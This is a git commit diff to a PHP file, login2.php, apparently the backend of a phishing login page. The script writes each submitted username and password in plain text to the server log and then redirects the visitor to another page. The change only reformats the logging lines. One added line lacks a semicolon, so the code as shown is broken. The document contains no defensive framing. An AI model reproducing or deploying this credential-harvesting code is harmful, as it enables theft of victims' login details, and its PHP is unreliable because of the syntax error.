a372d707a47d3219d9a913a1a08d6904ef52ee9f
rekcahkumar <48340011+rekcahkumar@users.noreply.github.com>
2021-04-14 18:48:02 +0530

    Add files via upload

--- login2.php
+++ login2.php
@@ -1,7 +1,8 @@
 <?php
 error_log("login found");
-error_log("\n\n----------------------------------");
-error_log("Username: " . $_POST['username'] . " \n Pass: " . $_POST['password'] );
-error_log("----------------------------------\n\n");
+error_log("----------------------------------");
+error_log("\nUsername: " . $_POST['username'] . " \n Pass: " . $_POST['password'] );
+error_log("\n")
+error_log("----------------------------------");
 header('Location:/index3.html');
 exit();
